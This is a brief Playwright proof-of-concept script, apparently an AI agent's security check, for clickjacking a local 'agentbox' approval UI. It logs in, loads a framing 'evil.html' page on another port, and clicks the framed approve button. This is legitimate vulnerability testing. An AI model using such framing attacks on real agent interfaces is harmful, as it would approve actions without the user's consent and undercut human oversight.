// Parent-live check: is the cookie-authenticated agentbox UI framable by a same-site origin (other port), and does a click inside the frame approve?
const { chromium } = require('/tmp/claude-0/-home-user-agentbox/d3718f34-2d87-5ca6-8bcd-dc70a1cecc79/scratchpad/pw/node_modules/playwright-core');
(async () => {
  const b = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' });
  const ctx = await b.newContext();
  const p = await ctx.newPage();
  await p.goto('http://127.0.0.1:8765/login');
  await p.fill('input[name=token]', process.env.HT);
  await Promise.all([p.waitForNavigation(), p.click('button.primary')]);
  console.log('logged in at', p.url());
  for (const top of ['http://127.0.0.1:9999/evil.html', 'http://localhost:9999/evil.html']) {
    const q = await ctx.newPage();
    await q.goto(top); await q.waitForTimeout(4000);
    const f = q.frames().find(fr => fr.url().includes(':8765'));
    const url = f ? f.url() : null;
    const btn = f ? await f.$('button:has-text("승인")') : null;
    console.log(top, '-> frame url', url, '| approve button in frame:', !!btn);
    if (btn && top.includes('127.0.0.1')) { await btn.click(); await q.waitForTimeout(3000); console.log('clicked approve inside frame'); }
    await q.close();
  }
  await b.close();
})();
